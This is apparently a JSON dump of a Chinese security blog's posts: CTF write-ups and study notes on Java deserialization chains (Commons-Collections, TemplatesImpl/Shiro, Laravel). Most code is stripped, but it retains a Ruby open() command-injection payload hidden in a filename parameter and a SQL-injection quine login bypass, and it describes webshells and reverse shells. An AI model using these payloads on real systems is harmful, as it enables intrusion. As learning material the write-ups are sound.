第二部分已知p2,q2之和,p2,q2之积，可通过求$x^2-(p_2+q_2)x+p_2q_2=0$的两个根得到p2,q2，再通过欧拉函数对素数幂的表达式$\\varphi(n2)=(p_2^2-p_2)(q_2^3-q_2^2)$求得，然后正常的RSA解密得flag2，最后将flag1和flag2合并即可 flag: Misc[warmup]音频隐写下载附件，丢入010分析，发现是WAV的文件头，于是把附件的后缀改为.wav 修改完之后，得到一段音频文件，既然题目提示了音频隐写，那就用Audacity打开这段音频分析一下 音频没发现有什么隐藏信息，于是 打开频谱图看看 得到flag: 创新技术无"},{"title":"java反序列化-TemplatesImpl在Shiro中的利用","date":"2021-10-03T10:14:04.000Z","url":"/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/","categories":[["java","/categories/java/"]],"content":"前言有段时间没学java了，最近被一堆事情和比赛拖着，国庆假期正好继续补一下java java反序列化-TemplatesImpl在Shiro中的利用之前已经知道如何将TemplatesImpl 融合到Commons-Collections利用链中，执行任意Java字节码。 这次要解决一个问题：为什么已经有CC6这种高版本通杀链了还需要TemplatesImpl的链子呢？ 可以用shiro反序列化来测试TemplatesImpl反序列化。 shiro反序列化的原理测试之前先添加一波依赖 为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。 使用CommonsCollections6攻击Shiro p神自己做了个小demo方便我这种菜鸡学习 demo下载地址  maven打成war包后放入tomcat的webapp目录即可。初始密码root/secret 登录时勾选remember me。 勾选之后登陆cookie会生成rememberMe字段，之前说了这个字段被发送到服务端进行反序列化，所以我们的攻击流程 使用以前学过的CommonsCollections利用链生成一个序列化Payload 将payload用shiro默认key加密 将加密后的payload放入rememberMe字段发送给服务端触发反序列化 可以用下面代码生成cc6的payload 将生成的payload直接打入会报错 p神自己经过调试给出结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。 我们的payload里就有数组 解决办法我们不能用到数组，回忆一下，触发反序列化的最关键的点在与LazyMap的get方法 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。 但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。还记得ConstantTransformer类的作用吗，在学cc1的时候提到过。 这起到一个简单的参数传递作用，那我们能不能找到代替这个作用且不需要数组的利用点呢。 再来看看LazyMap的get方法 我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，但此时发现，这个 LazyMap#get 的参数key，会被传进transform()，实际上它可以扮演 ConstantTransformer的角色，所以我们最后的难题也解决了 改造CC6为CCShiro 通过Client.java生成payload（别忘了写个Evil类用来获取字节码） 这里用到了javassist，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl 。 "},{"title":"蓝帽杯_one_Pointer_php复现","date":"2021-09-28T01:14:04.000Z","url":"/2021/09/28/%E8%93%9D%E5%B8%BD%E6%9D%AF_one_Pointer_php%E5%A4%8D%E7%8E%B0/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"下载源码 这里溢出即可，因为$count[]=1相当于在数组末位添加一个键值+1，值为1的数据，当前面的键值为long类型最大值时，+1后溢出造成报错绕过。 poc 之后是命令执行，看被ban的函数。 看phpinfo看到了fastcgi 绕过open_basedir读配置文件 读到了这个 fastcgi开在9001端口 写个shell，蚁剑连接。 这里蚁剑的绕过 disable_functions 插件是绕不过去的。 因为ban了fsockopen函数，插件源码是利用这个函数跟fpm通信的。 但可以改插件源码，把 fsockopen换成pfsockopen，两者没区别。还要改端口为9001. 显示root，虚拟终端执行webshell显示为www-data，直接读文件即可。 "},{"title":"2021第五空间webakwp","date":"2021-09-21T14:10:04.000Z","url":"/2021/09/21/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4webakwp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"前言挺傻逼的，5道web题全是静态靶机，三道rce题，不知道主办方咋想的。附一张图不过也算是ak了web 总体感觉还不错 webftp这题就要说到搅屎的问题了，我直接扫路径扫到1.txt看到flag，大概是哪位大师傅放的赛后跟别的师傅聊了一下，预期解是github上能下载源码然后看就行。 EasyCleanup源码逻辑很简单，给了phpinfo和任意文件包含这里的 session.upload_progress.cleanup 是off的，不会自动清除session文件那直接传PHPSESSID然后包含就行,都不需要条件竞争。exp 然后包含/tmp/sess_aa传命令即可 pklovecloud简单的反序列化poc 之后源码找flag PNG图片转换器这里利用了ruby的open函数能造成命令执行的特性open函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。 管道字符“|”开头，执行管道字符后面的命令 原题传文件，获得唯一文件名，然后读取文件的base64编码。在读取这里 file可控，但得满足上面的条件，这个限制也不是很严格上传两张图片记住文件名在/convernt处第一步file=|echo &quot;Y2F0IC8q&quot;|base64 -d &gt; 0784368baeb4d0a58b04309f20df6f2e.pngY2F0IC8q是cat /*的base64第二步file=|sh 0784368baeb4d0a58b04309f20df6f2e.png&gt;405391431ca1ac9b33f35add1f4ef55c.png之后读405391431ca1ac9b33f35add1f4ef55c.png拿到flag base64解码即可 补充赛后跟feng师傅聊了一下 发现不用这么麻烦，在上传处即可命令执行可以看到，加密的参数是file[filename]但open的参数file[tempfile]是可控的 所以直接再读这个文件即可 yet_another_mysql_injection能时间盲注，但数据库里啥也没有再看逻辑， 就是查询语句要和查询结果一样就可以了这篇文章很详细原文的payload改一下能用原文的SELECT REPLACE(REPLACE(&#39;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#39;,CHAR(34),CHAR(39)),CHAR(36),&#39;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#39;) AS Quine本题有过滤，且是注入，所以得改一下 更改后的：username=admin&amp;password=&#39;UNION/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHAR(34),CHAR(39)),CHAR(63),&quot;?&quot;)/**/AS/**/a#&#39;,CHAR(34),CHAR(39)),CHAR(63),&#39;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHAR(34),CHAR(39)),CHAR(63),&quot;?&quot;)/**/AS/**/a#&#39;)/**/AS/**/a#直接打就行 总结企业组第十三，，akweb的队伍很多，主要还是靠队友的misc re和密码才拿到这个名次，又被队友带飞了"},{"title":"2021祥云杯web部分wp","date":"2021-09-21T13:14:04.000Z","url":"/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"前言体验还行 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类 底下有个字符串拼接，可以触发__toString,全局搜索__toString AppendStream下有__toString 并且调用了rewind(),找找看这个rewindCachingStream类这里有，并且还调用了seek方法，seek又调用了read方法,在这个read方法里又调用了一个read方法 我们可以控制$this-&gt;stream为我们想要的类，查找read，最后在PumpStream类里 这个类有read方法 ，read调用了pump pump方法调用了call_user_func，所以可以RCE 就写到这吧 我把链子找完的时候队友已经出了，还告诉我网上有公开的poc，心累，说好的最新呢 安全检测检测127.0.0.1成功了 是ssrf，利用ssrf扫路径扫到了源码 包含一下session文件呗payload: 你的PHPSESSID&amp;payload=成功了 挺奇怪的 源码里ban了反引号我这里却可以用 不管了 flag出了就行。 层层穿透这题做了好久，只会一点java的我靠着github上的一键shell poc做完了第一层反弹shell，github有直接可以利用的工具 弹个shell到自己的公网上。题目提示内网信息搜集到了10.10.1.11:8080,估计是内网web环境，先把附件源码反编译一下，因为题目环境20分钟刷新一次，所以现在本地打对着源码逻辑先登录，账号密码源码里可以直接找到 看到admin/test路由存在fastjson反序列化点。不怎么会java反序列化，但是github上有不出网直接在数据包里回显的一键shellpoc照着github上的readme直接打，发现提示太短，看源码把poc复制两边再打就打通了本地打通了，之后是题目。我花了大部分时间在搞代理 有几个小时吧 最后选择了frp 确实方便frp教程端口转发成功后按照刚刚本地的步骤直接打就行（一定找个时间好好学java） Crawer_z引用了zombie框架，谷歌查找 全网只找到这个框架一篇漏洞漏洞描述攻击者可以在他们的页面中插入JS代码来利用zombiejs代码注入漏洞。如果使用zombiejs 抓取此类页面，则运行爬虫的机器将运行攻击者提供的任意命令。为了比较，jsdom 默认禁用脚本执行。 想办法让题目访问我们准备的恶意页面就行。payload在这个博客里都准备好了，提取一下 改成弹shell的 有了payload，我们要想办法让题目访问我们的恶意页面。看一下源码。在user.js下看到访问/user/bucket似乎会自动访问我们个人信息里设置的bucket，尝试访问。尝试更改bucket设置，先看源码在checkBucket函数下，看到bucket的要求，必须以http:或者https:为开头，且必须包含oss-cn-beijing.ichunqiu.com我们尝试修改前面为自己的公网ip地址点击更新 变回原来的了，并且提示admin会来检查，但在源码里看到这里其实算是更改失败了，admin不会去检查源码里有个重定向到/user/verify?token=${authToken}，我们尝试用队伍token浏览器url输入队伍token修改bucket，但不要点击update，直接在访问我们放入队伍token后的url提示更改成功 看到我们的bucket也被设置成了我们的服务器地址其实这里我还没怎么懂原理，只是试了一下发现可以，那就歪打正着直接用。再访问/user/bucket回显的内容变了，报错404，这是因为我的公网上没有oss-cn-beijing.ichunqiu.com这个文件。到这里思路就很清晰了，我们在公网上放置一个oss-cn-beijing.ichunqiu.com.html恶意文件，然后修改bucket为http://公网ip地址/oss-cn-beijing.ichunqiu.com.html并且这个html文件已经被我们插入了用&lt;script&gt;标签包裹的恶意payload服务器起个监听题目内访问/user/bucket弹成功了。 这次比赛就做了这四道题，做完java那题距比赛结束就1小时了，被队友带飞进了前三十 队友们tql"},{"title":"一条laravel5.1的链子","date":"2021-09-10T13:14:04.000Z","url":"/2021/09/10/%E4%B8%80%E6%9D%A1laravel5.1%E7%9A%84%E9%93%BE%E5%AD%90/","categories":[["框架","/categories/%E6%A1%86%E6%9E%B6/"]],"content":" ## 前言挖一整天才挖出这一条，主要是钻牛角尖了，逮着一个地方使劲找链子。 poc先放poc吧 poc分析。我找的destruct方法是Swift_Transport_AbstractSmtpTransport类的看一下他做了什么。 调用了该类的stop方法 看一下stop 箭头这里可以触发__call方法，之后找__call就可以了。但这个类是一个抽象类，所以用他的子类Swift_Transport_EsmtpTransport。 之后是找__call方法。我找到的是DatabaseManager类，看一下他的__call方法。 调用了该类的connection方法，看一下这个方法。 重点在于$this-&gt;makeConnection方法 可以看到最下面可以调用任意类的make方法。但其实这里本身就有call_user_func方法，但这里的没办法利用，这个等一下说原因。全局找make方法。最后在FactoryBuilder里 该类的make调用了makeInstance再看看makeInstance 可以看到call_user_func了，并且参数全可控。所以我们的链子就通了 一些细节解答一下之前makeConnection方法里的call_user_func为啥不能用。我们看一下他的参数。 第一个参数extensions[$name]是可控的，没有问题，关键是第二个config参数，看一下这个参数是怎么来的。 是该类的getConfig方法来的，看一下这个方法。 return的值是Arr::get方法的返回值，看一下这个方法 可以看到，不管怎么样，返回的都是一个数组。所以这个call_user_func不是很好利用。但应该也有利用的方法，我比较懒就找下面的了。而且正好我们FactoryBuilder里的make方法需要数组作为参数不然就会报错，所以这个config就很好的符合我们的要求但最后的makeInstance方法，因为第三个参数是数组，在执行时会报错。所以时没有回显的，但可以反弹shell或者写文件。我poc里构造的相当于 总结不算很好的链子，利用复杂，构造的参数也很严苛。"},{"title":"java反序列化CC3","date":"2021-09-08T13:14:04.000Z","url":"/2021/09/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CC3/","categories":[["java","/categories/java/"]],"content":"学习动态加载字节码的时候学到了TemplatesImpl加载字节码的方法。我们也可以利用这个特性进行命令执行。结合之前CC1的手动加载我们可以写一个简单的demo，这里用p神的 这里同样是手动触发的put，我们尝试利用cc1的TransformedMap链子触发。这里我自己写了个poc 当然LazyMap也是可以通的。 但CC3链子的出现自然有他的道理。CC3产生的目的就是为了绕过⼀些过滤器对InvokerTransformer的限制。越来越多的过滤器将InvokerTransformer类加入了黑名单，CC3链就是为了突破这个限制产生的。在ysoserial的CC3链子中能看到一些新东西。可以看到将InvokerTransformer换成了InstantiateTransformer类。并且引入了一个新的类com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter在这个类的构造函数里面 该构造函数的参数为Templates接口，而且我们之前利用的加载字节码的TemplatesImpl类实现了该接口。构造函数在给__transformer参数赋值的时候进行了类型转换并且调用了newTransformer()方法。这个newTransformer()就是我们利用TemplatesImpl加载字节码的起点。但是没有InvokerTransformer如何调用这个构造方法？这里用到了InstantiateTransformer类 InstantiateTransformerInstantiateTransformer类也是一个实现了Transformer接口的类，看看他的transformer方法做了什么。 这里利用反射的机制调用了构造函数。iArgs参数就是我们的TemplatesImpl类。前面说到我们需要调用TrAXFilter的构造函数才能加载字节码，所以我们能利用这个类来调用TrAXFilter的构造方法就可以加载字节码，到此CC3就通了。poc "},{"title":"java反序列化CC6","date":"2021-09-04T13:14:04.000Z","url":"/2021/09/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CC6/","categories":[["java","/categories/java/"]],"content":"因为sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化，导致cc1的链子在8u71版本后无法使用。所以要找一条能在java更高版本使用的链子。 cc6的简化版利用链 p神给的poc CC1是触发LazyMap.get方法进行命令执行，CC6是找到其他调用这个方法的地方。这个类是 org.apache.commons.collections.keyvalue.TiedMapEntry ，在其getValue⽅法中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法： 所以又要去找哪里触发了TiedMapEntry.hashCode()。在java.util.HashMap#readObject调用了hashCode该方法最后调用了hash，跟进hash方法看到hash方法调用了hashCode poc里用了个fakeTransformers p神在java安全漫谈反序列化5里讲到了他的作用，主要是为了防止本地调试的时候触发命令执行。 关于poc中的outerMap.remove(“keykey”);去掉outerMap.remove(“keykey”);则无法命令执行，主要原因在expMap.put(tme, “valuevalue”);中expMap是HashMap的实例HashMap.put中也调用了hash，但我们传入的是fakeTransformers，所以对poc产生了一定的影响。 在反序列化的过程中，触发反序列化最重要的LazyMap.get方法中并没有进入if分支里面，所以没有触发transfrom。所以为了让containsKey(key)判断为flase，用outerMap.remove(“keykey”);移除即可。触发transfrom之后的过程就跟cc1时一样的。"},{"title":"java动态加载字节码的方法","date":"2021-09-04T13:14:04.000Z","url":"/2021/09/04/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","categories":[["java","/categories/java/"]],"content":"讨论方法前先来看看什么是字节码 什么是java字节码严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。但是我们讨论的字节码可以扩大范围——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。Java的ClassLoader来用来加载字节码文件最基础的方法 ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。 方法一、利用URLClassLoader加载远程class文件URLClassLoader是AppClassLoader的父类，该类可以加载远程class文件。正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们这里要利用第三种，协议得是非file，最常见的就是http先创建一个恶意类 在class文件所在的文件夹下用python快速起一个http服务器之后试试能不能用UrlClassLoader加载这个类 成功弹出计算器所以在实战中，我们如果能控制ClassLoader为一个http服务器就能加载恶意类。 方法二、利用ClassLoader#defineClass直接加载字节码不管是加载远程的class文件还是本地的class文件都是经历下面三个方法调用javaClassLoader#loadClass-&gt;ClassLoader#findClass-&gt;ClassLoader#defineClass loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类 其核心应该是在defineClass方法，因为这个方法才是最后把字节码转化成真正的java类。我们本地测试一下好了。一个恶意类，弹出计算机 编译成class文件，用shell输出base64编码的字节码之后利用definClass加载 成功弹出计算器 方法三、利用TemplatesImpl加载字节码TemplatesImpl相对于ClassLoader比较底层，但原理是defineClass()在TemplatesImpl内部的静态类TransletClassLoader被重载。 但这个方法是个private方法不能被外部调用，我们继续看看。看到getTransletInstance调用了这个方法，但这仍是个私有方法 继续看最好在NewTransformer方法调用了getTransletInstance，并且这是个public方法，可以外部调用。 调用链是这样的 所以poc就有了，这里放p神的 可以看到poc这里用反射设置了三个参数的值，在源码里可以看到原因_bytecodes是字节码为空的话回返回一个错误_name可以任意赋值，不为空就行 defineTransletClasses()的run方法调用了_tfactory.getExternalExtensionsMap()，_tfactory所以不能为空 值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。所以需要构造一个特殊的类来触发。 成功弹出计算器 TemplatesImpl似乎在fastjson和jackson出现的比较多，以后会学到。 方法四、利用BCEL ClassLoader加载字节码BCEL也是个大知识点，以后重点学习，这里放一下poc。 讨论方法前先来看看什么是字节码 什么是java字节码严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。但是我们讨论的字节码可以扩大范围——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。Java的ClassLoader来用来加载字节码文件最基础的方法 ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。 方法一、利用URLClassLoader加载远程class文件URLClassLoader是AppClassLoader的父类，该类可以加载远程class文件。正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们这里要利用第三种，协议得是非file，最常见的就是http先创建一个恶意类 在class文件所在的文件夹下用python快速起一个http服务器之后试试能不能用UrlClassLoader加载这个类 成功弹出计算器所以在实战中，我们如果能控制ClassLoader为一个http服务器就能加载恶意类。 方法二、利用ClassLoader#defineClass直接加载字节码不管是加载远程的class文件还是本地的class文件都是经历下面三个方法调用javaClassLoader#loadClass-&gt;ClassLoader#findClass-&gt;ClassLoader#defineClass loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类 其核心应该是在defineClass方法，因为这个方法才是最后把字节码转化成真正的java类。我们本地测试一下好了。一个恶意类，弹出计算机 编译成class文件，用shell输出base64编码的字节码之后利用definClass加载 成功弹出计算器 方法三、利用TemplatesImpl加载字节码TemplatesImpl相对于ClassLoader比较底层，但原理是defineClass()在TemplatesImpl内部的静态类TransletClassLoader被重载。 但这个方法是个private方法不能被外部调用，我们继续看看。看到getTransletInstance调用了这个方法，但这仍是个私有方法 继续看最好在NewTransformer方法调用了getTransletInstance，并且这是个public方法，可以外部调用。 调用链是这样的 所以poc就有了，这里放p神的 可以看到poc这里用反射设置了三个参数的值，在源码里可以看到原因_bytecodes是字节码为空的话回返回一个错误_name可以任意赋值，不为空就行 defineTransletClasses()的run方法调用了_tfactory.getExternalExtensionsMap()，_tfactory所以不能为空 值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。所以需要构造一个特殊的类来触发。 成功弹出计算器[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Ypdjjawo-1632274419328)()]TemplatesImpl似乎在fastjson和jackson出现的比较多，以后会学到。 方法四、利用BCEL ClassLoader加载字节码BCEL也是个大知识点，以后重点学习，这里放一下poc。 "},{"title":"java反序列化CC1-3","date":"2021-09-03T13:14:04.000Z","url":"/2021/09/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-3/","categories":[["java","/categories/java/"]],"content":" cc1链的最后了。TransformedMap换成了LazyMappoc 核心主要在于LazyMap类的get方法。 如果传入的参数不存在，则调用factory的transform。可以试着写一个非反序列化的命令执行 弹出了计算机（不知道问什么点开就闪退）调试一下看看 可以看到我们get的test这个key是不存在的，所以进入if调用了factory的transform，这个factory就是decorate方法的第二个参数，看源码就知道。[之后的过程就跟之前的TransformedMap链是一样的。 这里是手动执行的get，我们继续研究反序列化的poc。 动态代理sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中并没有直接调用到Map的get方法。但是AnnotationInvocationHandler类的invoke方法调用了get 调用AnnotationInvocationHandler的invoke方法，这里用到了java对象代理。动态代理详解可以看这篇文章。不过本地调试一下更能理解过程 其实看名字就能看出来AnnotationInvocationHandler实际上就是个InvocationHandler，所以用AnnotationInvocationHandler对我们的map进行代理，这样调用任意方法都会进入AnnotationInvocationHandler.invoke方法进而触发get实现命令执行 总结勉强看完了，但对代理这一块还不是很熟，找个时间自己学一下"},{"title":"java反序列化CC1-2","date":"2021-09-02T13:14:04.000Z","url":"/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/","categories":[["java","/categories/java/"]],"content":" 上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 不过这个poc我本地算是弹失败了，因为java版本的原因，在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用。我的版本正好是8u71。不过我来学习思路，也懒的改版本了。 sun.reflect.annotation.AnnotationInvocationHandler触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可 以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。这个类就是 sun.reflect.annotation.AnnotationInvocationHandler源码就不放了，逻辑就是调用了setValue方法，这个方法也能触发TransformedMap里注册的Transform。 关于反射的问题看到前面我们生产Runtime类的时候是直接调用getRuntime方法的[ 但这次的poc不一样，是利用反射调用的 这里涉及到反序列化的条件。1、该类必须直接实现java.io.Serializable接口或者间接从其继承树中实现该接口(也就是他的某个父类实现了这个接口);2、对于该类的所有无法序列化的属性(本文指字段field, 而不是严格意义上的属性property, 下同)必须使用transient修饰。 但Runtime类是没有实现java.io.Serializable接口的，所以不能直接反序列化，但反射能解决这个问题，将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。 但是AnnotationInvocationHandler 也不能直接实例化，仍然需要利用反射的机制 总结真累，接下来是CC1的LazyMap，比起TransformedMap似乎LazyMap用的更多"},{"title":"java反序列化CC1-1","date":"2021-09-01T13:14:04.000Z","url":"/2021/09/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-1/","categories":[["java","/categories/java/"]],"content":" 最近入门java安全，看一下最基础的CC1链子（URLDNS已经偷偷学过了）先来看看p神原创的最简代码 这里涉及到几个接口和类，一个一个看 Transformer这是个接口，源码也很简单。 看注释，把一个输入的对象输出，这个对象应该保持不变。 TransformedMap及其decorate方法 decorate中 第一个参数为修饰的Map类，第二个参数和第三个参数都是一个实现了Transformer接口的类，转换Map的键和值，为null则不转换。当被修饰的map添加新元素时会分别触发这两个类的transfom方法，也就是说我们之后只要找到能利用的transform方法即可。具体看下面这篇文章里面的一个例子 ConstantTransformer 构造该类时传入一个对象，并在调用transform时返回该对象，算是一种封装。 InvokerTransformer 该类也实现了Transformer类接口的一个类第一个参数是待执行的方法名，第二个参数是函数的参数类型，第三个参数是这个函数的参数列表。重点在改类的transform方法前面说过，通过TransformedMap的decorate方法可以调用任意类的transform方法，所以InvokerTransformer类中的transform及是我们要找的恶意方法，因为他可以导致任意命令执行。 执行原理也很简单，结合之前学过的反射机制很容易就能看懂。 ChainedTransformer 该类也实现了Transformer接口。其构造函数的参数为Transformer[]。主要逻辑算是一种链式调用。将transformers中多个实现Transformer接口的类串在一起，第一个传入的object为第一个类的transform方法的参数，再将执行结果作为transformers列表中下一个类的transform方法的参数。 理解了这些类，再看看p神的构造里的一段。 这里实例化了Transformer[]列表，在下面作为了ChainedTransformer类实例化时的参数。该Transformer[]包含两个Transformer:第一个是ConstantTransformer， 直接返回当前环境的Runtime对象;第二个是InvokerTransformer，获取了exec方法，里面的Object为参数，即exec的参数，这里就是计算器。 总的分析 这里先实例化了一个HashMap类，再用TransformedMap.decorate修饰该类返回了一个新的Map类。前面说过，再被TransformedMap.decorate修饰过的类中添加新元素时会触发第二、第三个参数的transform方法。利用outerMap.put就添加了新元素。下面的这里第二个参数为null，第三个参数为上面实例化的一个ChainedTransformer类。 ChainedTransformer类的transform方法被触发，参数为Transformer[]类。之后利用ChainedTransformer的transform方法链式调用进行命令执行。 总结这算是个半个CC1链子，因为是手动触发的put方法，接下来学完整的CC1链子"},{"title":"java反射学习-3","date":"2021-08-29T13:14:04.000Z","url":"/2021/08/29/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-3/","categories":[["java","/categories/java/"]],"content":"解决两个问题1.如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？2.如果一个方法或构造方法是私有方法，我们是否能执行它呢？ 第一个问题这里要引入新的反射方法 getConstructor 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。 ProcessBuilder有两个构造函数： 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令： 上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表 达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。其实用的就是前面讲过的知识： 通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反 射执行呢？ 这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。 对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价 的（也就不能重载）： 那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。 所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数： 在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下： 第二个问题这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：1.getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法2.getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了举个例子，前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令： "},{"title":"java反射学习-2","date":"2021-08-26T13:14:04.000Z","url":"/2021/08/26/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-2/","categories":[["java","/categories/java/"]],"content":"上一篇学完了反射的基础，接下来深入学习一下。 在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类 同时，forName()还可以获取内部类 我们通过forName获得类之后用newInstance()来调用这个类的无参构造函数，但有时这个方法会失败，原因可能是： 你使用的类没有无参构造函数 你使用的类构造函数是私有的常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令： 因为Runtime类的构造方法是私有的。但还是有方法获取到这个类的，这涉及到单例模式。比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取： 